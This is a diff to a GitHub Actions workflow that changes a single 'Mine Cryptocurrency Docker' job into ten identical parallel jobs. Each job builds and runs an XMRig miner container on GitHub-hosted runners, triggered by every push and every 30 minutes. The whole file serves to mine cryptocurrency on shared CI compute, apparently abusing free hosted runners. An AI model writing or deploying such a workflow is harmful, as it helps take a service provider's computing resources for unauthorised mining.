@@ -1,24 +1,169 @@
-name: Mine Cryptocurrency Docker
+name: Parallel Mine Cryptocurrency
 
 on:
   push:
     branches:
       - main
   schedule:
-    - cron: '*/30 * * * *'
+    - cron: "*/30 * * * *"
 
 jobs:
-  mine:
+  mine_1:
     runs-on: ubuntu-latest
-
     steps:
       - name: Check out the repository
         uses: actions/checkout@v2
-
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
       - name: Build Docker image
         run: |
-          docker build -t xmrig-miner -f ./dockerfiles/xmrig.Dockerfile .
-
+          docker build -t xmrig-miner .
       - name: Run XMRig in Docker
         run: |
-          docker run xmrig-miner
+          docker run --rm xmrig-miner
+
+  mine_2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_4:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_5:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_6:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_7:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_8:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_9:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
+
+  mine_10:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+      - name: Install Docker
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+      - name: Build Docker image
+        run: |
+          docker build -t xmrig-miner .
+      - name: Run XMRig in Docker
+        run: |
+          docker run --rm xmrig-miner
